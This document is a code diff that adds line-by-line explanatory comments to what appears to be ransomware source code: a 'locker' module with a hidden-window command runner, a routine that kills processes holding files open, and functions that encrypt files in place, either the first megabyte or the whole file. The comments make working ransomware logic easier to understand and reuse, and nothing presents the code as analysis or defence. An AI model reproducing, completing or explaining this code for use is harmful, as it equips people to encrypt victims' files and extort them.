@@ -35,28 +35,36 @@ locker::SetWhiteListProcess(process_killer::PWHIELIST_PROCESS_LIST Whitelist)
 VOID 
 locker::SetWhiteListProcess(__in process_killer::PPID_LIST PidList)
 {
+    // Assign the PidList parameter to the global whitelist PIDs variable
 	g_WhitelistPids = PidList;
 }
 
+// Declare a function for executing a command in a hidden window
 VOID CmdExecW(LPCWSTR lpCmdLine)
 {
+	// Declare variables for the startup information and process information
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	WCHAR CmdLine[1024];
 
+    // Clear the memory of the variables
 	SecureZeroMemory(CmdLine, sizeof(CmdLine));
 	SecureZeroMemory(&si, sizeof(si));
 	SecureZeroMemory(&pi, sizeof(pi));
 
+    // Set the startup information for the hidden window
 	si.wShowWindow = SW_HIDE;
 	si.cb = sizeof(si);
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	plstrcpyW(CmdLine, lpCmdLine);
 
+    // Create a new process with the specified command line in a hidden window
 	if (pCreateProcessW(NULL, CmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-
+        // Wait for the process to complete or until the timeout (10 seconds) is reached
 		pWaitForSingleObject(pi.hProcess, 10000);
+        
+        // Close the handles for the process and its main thread
 		pCloseHandle(pi.hThread);
 		pCloseHandle(pi.hProcess);
 
@@ -719,17 +727,24 @@ WriteEncryptInfo(
 	return Success;
 }
 
+// Declare a function to open a file for encryption and return a DWORD status value
 STATIC
 DWORD
 OpenFileEncrypt(__in locker::LPFILE_INFO FileInfo)
 {
+    // Retrieve the attributes of the file
 	DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo->Filename);
+    
+    // If the attributes are valid
 	if (Attributes != INVALID_FILE_ATTRIBUTES) {
+        // If the file is read-only
 		if (Attributes & FILE_ATTRIBUTE_READONLY) {
+            // Remove the read-only attribute
 			pSetFileAttributesW(FileInfo->Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);
 		}
 	}
 
+    // Open the file with read and write permissions
 	FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
 		GENERIC_READ | GENERIC_WRITE,
 		0,
@@ -738,21 +753,26 @@ OpenFileEncrypt(__in locker::LPFILE_INFO FileInfo)
 		0,
 		NULL);
 
+    // Get the last error (if any)
 	DWORD LastError = (DWORD)pGetLastError();
+    
+    // If the file handle is invalid
 	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)
 	{
-
+        // If the error is due to a sharing violation or lock violation
 		if (LastError == ERROR_SHARING_VIOLATION ||
 			LastError == ERROR_LOCK_VIOLATION)
 		{
-
+            // Log the error
 			logs::Write(OBFW(L"File %s is already open by another program."), FileInfo->Filename);
 
+            // Attempt to kill the owner of the file
 			if (KillFileOwner(FileInfo->Filename))
 			{
-
+                // If successful, log the success
 				logs::Write(OBFW(L"KillFileOwner for file %s - success"), FileInfo->Filename);
 
+                // Try to open the file again
 				FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
 					GENERIC_READ | GENERIC_WRITE,
 					0,
@@ -761,92 +781,124 @@ OpenFileEncrypt(__in locker::LPFILE_INFO FileInfo)
 					0,
 					NULL);
 
+                // If the file handle is still invalid
 				if (FileInfo->FileHandle == INVALID_HANDLE_VALUE) {
-
+                    // Log the error
 					logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
+                    // Return a failure status
 					return FALSE;
 
 				}
 
 			}
 			else {
-
+                // If killing the owner failed, log the error
 				logs::Write(OBFW(L"KillFileOwner for file %s - error. GetLastError = %lu."), FileInfo->Filename, pGetLastError());
+                // Return a failure status
 				return FALSE;
 
 			}
 
 		}
 		else {
-
+            // If the error is something else, log the error
 			logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
+            // Return a failure status
 			return FALSE;
 
 		}
 
 	}
 
+    // Declare a LARGE_INTEGER to hold the file size
 	LARGE_INTEGER FileSize;
+    
+    // If getting the file size fails or the file size is 0
 	if (!pGetFileSizeEx(FileInfo->FileHandle, &FileSize) || !FileSize.QuadPart) {
-
+        // Log the error
 		logs::Write(OBFW(L"Can't get file size %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
+        // Close the file handle
 		CloseHandle(FileInfo->FileHandle);
+        // Return a failure status
 		return FALSE;
 
 	}
 
+	// Save the file size to the FileInfo structure
 	FileInfo->FileSize = FileSize.QuadPart;
+	
+	// Return TRUE indicating that the file was successfully opened and its size was retrieved
 	return TRUE;
 }
 
+// Define the function EncryptHeader with the specified parameters
 STATIC
 BOOL
 EncryptHeader(
-	__in locker::LPFILE_INFO FileInfo,
-	__in LPBYTE Buffer,
-	__in HCRYPTPROV CryptoProvider,
-	__in HCRYPTKEY PublicKey
+	__in locker::LPFILE_INFO FileInfo, // Input structure containing file information
+	__in LPBYTE Buffer,                // Input buffer for reading file data
+	__in HCRYPTPROV CryptoProvider,    // Handle to a cryptographic service provider (CSP)
+	__in HCRYPTKEY PublicKey           // Cryptographic key
 )
 {
-	BOOL Success = FALSE;
-	DWORD BytesRead = 0;
-	DWORD BytesToRead = 0;
-	DWORD BytesToWrite = 0;
-	LONGLONG TotalRead = 0;
-	LONGLONG BytesToEncrypt;
-	LARGE_INTEGER Offset;
+	// Initialize various variables
+	BOOL Success = FALSE;              // Flag to indicate if the operation was successful
+	DWORD BytesRead = 0;               // Number of bytes read from the file
+	DWORD BytesToRead = 0;             // Number of bytes to read from the file
+	DWORD BytesToWrite = 0;            // Number of bytes to write to the file
+	LONGLONG TotalRead = 0;            // Total number of bytes read from the file
+	LONGLONG BytesToEncrypt;           // Total number of bytes to encrypt
+	LARGE_INTEGER Offset;              // Offset for setting the file pointer
 
+	// Set the total number of bytes to encrypt to 1048576 (1 MB)
 	BytesToEncrypt = 1048576;
 
+	// While there are still bytes left to encrypt
 	while (TotalRead < BytesToEncrypt) {
 
+		// Calculate the number of bytes left to encrypt
 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
+
+		// Determine the number of bytes to read from the file
 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;
 
+		// Read the specified number of bytes from the file
 		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
+
+		// If the read was not successful or no bytes were read, break the loop
 		if (!Success || !BytesRead) {
 			break;
 		}
 
+		// Add the number of bytes read to the total
 		TotalRead += BytesRead;
+
+		// Set the number of bytes to write to the number of bytes read
 		BytesToWrite = BytesRead;
 
+		// Encrypt the data read from the file
 		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);
 
+		// Set the file pointer to the start of the data that was just read
 		Offset.QuadPart = -((LONGLONG)BytesRead);
 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
 			break;
 		}
 
+		// Write the encrypted data to the file
 		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
+
+		// If the write was not successful, break the loop
 		if (!Success) {
 			break;
 		}
 
 	}
 
+	// Return TRUE indicating that the function executed successfully
 	return TRUE;
 }
+
 
 STATIC
 BOOL
@@ -932,45 +984,57 @@ EncryptPartly(
 	return TRUE;
 }
 
+// Function to fully encrypt a file, with input parameters being file information, buffer, cryptographic service provider, and public key
 STATIC
 BOOL
 EncryptFull(
-	__in locker::LPFILE_INFO FileInfo,
-	__in LPBYTE Buffer,
-	__in HCRYPTPROV CryptoProvider,
-	__in HCRYPTKEY PublicKey
+	__in locker::LPFILE_INFO FileInfo,      // Input structure containing file information
+	__in LPBYTE Buffer,                     // Input buffer for reading file data
+	__in HCRYPTPROV CryptoProvider,         // Handle to a cryptographic service provider (CSP)
+	__in HCRYPTKEY PublicKey                // Cryptographic public key
 )
 {
-	BOOL Success = FALSE;
-	DWORD BytesRead = 0;
-	DWORD BytesToRead = 0;
-	DWORD BytesToWrite = 0;
-	LONGLONG TotalRead = 0;
-	LONGLONG BytesToEncrypt;
-	LARGE_INTEGER Offset;
+	// Initialize various variables
+	BOOL Success = FALSE;                    // Flag to indicate if the operation was successful
+	DWORD BytesRead = 0;                     // Number of bytes read from the file
+	DWORD BytesToRead = 0;                   // Number of bytes to read from the file
+	DWORD BytesToWrite = 0;                  // Number of bytes to write to the file
+	LONGLONG TotalRead = 0;                  // Total number of bytes read from the file
+	LONGLONG BytesToEncrypt;                 // Total number of bytes to encrypt
+	LARGE_INTEGER Offset;                    // Offset for setting the file pointer
 
+	// Set the number of bytes to encrypt as the file size
 	BytesToEncrypt = FileInfo->FileSize;
 
+	// Loop until all the bytes are encrypted
 	while (TotalRead < BytesToEncrypt) {
 
+		// Calculate the number of bytes left to encrypt
 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
+		// Set the number of bytes to read as the minimum of the buffer size and the bytes left
 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;
 
+		// Read the file data into the buffer
 		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
 		if (!Success || !BytesRead) {
 			break;
 		}
 
+		// Update the total read bytes
 		TotalRead += BytesRead;
+		// Set the number of bytes to write as the number of bytes read
 		BytesToWrite = BytesRead;
 
+		// Encrypt the buffer data
 		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);
 
+		// Set the file pointer to the beginning of the read bytes
 		Offset.QuadPart = -((LONGLONG)BytesRead);
 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
 			break;
 		}
 
+		// Write the encrypted data to the file
 		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
 		if (!Success) {
 			break;
@@ -978,8 +1042,10 @@ EncryptFull(
 
 	}
 
+	// Return TRUE indicating successful full encryption
 	return TRUE;
 }
+
 
 BOOL
 locker::Encrypt(
